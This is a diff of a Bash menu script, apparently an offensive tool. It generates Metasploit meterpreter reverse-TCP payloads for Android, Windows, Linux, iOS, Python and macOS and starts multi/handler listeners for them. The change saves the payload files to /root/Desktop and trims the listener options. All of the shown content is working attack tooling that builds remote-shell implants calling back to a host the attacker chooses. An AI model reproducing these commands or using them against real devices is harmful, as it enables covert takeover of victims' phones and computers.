@@ -897,8 +897,8 @@ echo
 read -p "Enter The Host: " host
 read -p "Enter The Port: " port
 read -p "Enter the Name: " name
-msfvenom -p android/meterpreter/reverse_tcp LHOST=$host LPORT=$port R> $name.apk
-msfconsole -x 'use exploit/multi/handler' -x 'set payload android/meterpreter/reverse_tcp' -x 'set lport '$port -x 'set lhost '$host -x 'exploit -j'
+msfvenom -p android/meterpreter/reverse_tcp LHOST=$host LPORT=$port R > /root/Desktop/$name.apk
+msfconsole -x 'use exploit/multi/handler' -x 'set payload android/meterpreter/reverse_tcp'
 fi
 if [ $payload = 2 ]
 then
@@ -906,8 +906,8 @@ echo
 read -p "Enter The Host: " host
 read -p "Enter The Port: " port
 read -p "Enter the Name: " name
-msfvenom -p windows/meterpreter/reverse_tcp LHOST=$host LPORT=$port -f exe -o $name.exe
-msfconsole -x 'use exploit/multi/handler' -x 'set payload windows/meterpreter/reverse_tcp' -x 'set lport '$port -x 'set lhost '$host -x 'exploit -j'
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=$host LPORT=$port -f exe -o /root/Desktop/$name.exe
+msfconsole -x 'use exploit/multi/handler' -x 'set payload windows/meterpreter/reverse_tcp'
 fi
 if [ $payload = 3 ]
 then
@@ -915,8 +915,8 @@ echo
 read -p "Enter The Host: " host
 read -p "Enter The Port: " port
 read -p "Enter the Name: " name
-msfvenom -p linux/x86/meterpreter/reverse_tcp -f elf LHOST=$host LPORT=$port -o $name.elf
-msfconsole -x 'use exploit/multi/handler' -x 'set payload linux/x86/meterpreter/reverse_tcp' -x 'set lport '$port -x 'set lhost '$host -x 'exploit -j'
+msfvenom -p linux/x86/meterpreter/reverse_tcp -f elf LHOST=$host LPORT=$port -o /root/Desktop/$name.elf
+msfconsole -x 'use exploit/multi/handler' -x 'set payload linux/x86/meterpreter/reverse_tcp'
 fi
 if [ $payload = 4 ]
 then
@@ -924,8 +924,8 @@ echo
 read -p "Enter The Host: " host
 read -p "Enter The Port: " port
 read -p "Enter the Name: " name
-msfvenom -p apple_ios/aarch64/meterpreter_reverse_tcp LHOST=$host LPORT=$port -o $name.api
-msfconsole -x 'use exploit/multi/handler' -x 'set payload apple_ios/aarch64/meterpreter_reverse_tcp' -x 'set lport '$port -x 'set lhost '$host -x 'exploit -j'
+msfvenom -p apple_ios/aarch64/meterpreter_reverse_tcp LHOST=$host LPORT=$port -o /root/Desktop/$name.api
+msfconsole -x 'use exploit/multi/handler' -x 'set payload apple_ios/aarch64/meterpreter_reverse_tcp'
 fi
 if [ $payload = 5 ]
 then
@@ -933,8 +933,8 @@ echo
 read -p "Enter The Host: " host
 read -p "Enter The Port: " port
 read -p "Enter the Name: " name
-msfvenom -f raw -p python/meterpreter/reverse_tcp LHOST=$host LPORT=$port R> $name.py
-msfconsole -x 'use exploit/multi/handler' -x 'set payload python/meterpreter/reverse_tcp' -x 'set lport '$port -x 'set lhost '$host -x 'exploit -j'
+msfvenom -f raw -p python/meterpreter/reverse_tcp LHOST=$host LPORT=$port R> /root/Desktop/$name.py
+msfconsole -x 'use exploit/multi/handler' -x 'set payload python/meterpreter/reverse_tcp'
 fi
 if [ $payload = 6 ]
 then
@@ -942,8 +942,8 @@ echo
 read -p "Enter The Host: " host
 read -p "Enter The Port: " port
 read -p "Enter the Name: " name
-msfvenom -p osx/x64/meterpreter_reverse_tcp -f macho LHOST=$host LPORT=$port -o $name.macho
-msfconsole -x 'use exploit/multi/handler' -x 'set payload osx/x64/meterpreter_reverse_tcp' -x 'set lport '$port -x 'set lhost '$host -x 'exploit -j'
+msfvenom -p osx/x64/meterpreter_reverse_tcp -f macho LHOST=$host LPORT=$port -o /root/Desktop/$name.macho
+msfconsole -x 'use exploit/multi/handler' -x 'set payload osx/x64/meterpreter_reverse_tcp'
 fi
 fi
 ######################################
